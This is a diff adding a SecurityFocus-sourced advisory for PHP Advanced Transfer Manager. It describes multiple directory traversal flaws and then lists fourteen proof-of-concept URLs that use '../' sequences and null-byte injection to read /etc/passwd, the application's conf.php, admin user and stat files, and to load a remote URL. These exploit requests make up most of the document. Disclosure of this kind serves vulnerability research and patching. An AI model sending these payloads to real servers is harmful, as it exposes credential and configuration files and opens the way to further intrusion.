@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/14883/info
+
+PHP Advanced Transfer Manager is prone to multiple directory traversal vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+Exploitation of any of these vulnerabilities could lead to a loss of confidentiality. Information obtained may aid in further attacks against the underlying system; other attacks are also possible. 
+
+http://www.example.com/phpatm/viewers/txt.php?currentdir=../../../../../../../etc/passwd%00
+http://www.example.com/phpatm/viewers/txt.php?currentdir=../../../../../../../etc&filename=passwd
+http://www.example.com/phpatm/viewers/htm.php?current_dir=../../../../../../../etc/passwd%00
+http://www.example.com/phpatm/viewers/htm.php?current_dir=../../../../../../../etc&filename=passwd
+http://www.example.com/phpatm/viewers/html.php?current_dir=../../../../../../../etc/passwd%00
+http://www.example.com/phpatm/viewers/html.php?current_dir=../../../../../../../etc&filename=passwd
+http://www.example.com/phpatm/viewers/htm.php?current_dir=http://www.asite.com%00
+http://www.example.com/phpatm/html.php?current_dir=http:/&filename=www.asite.com
+http://www.example.com/phpatm/viewers/zip.php?current_dir=../../../../../../../[filename].zip%00
+http://www.example.com/phpatm/viewers/zip.php?current_dir=../../../../../../..&filename=[filename].zip
+http://www.example.com/phpatm/viewers/txt.php?current_dir=../include&filename=conf.php
+http://www.example.com/phpatmviewers/txt.php?current_dir=../userstat&filename=[admin_name].stat
+http://www.example.com/phpatm/viewers/txt.php?current_dir=../users/admin%00
+http://www.example.com/phpatm/viewers/txt.php?current_dir=../users/[admin_name]%00 
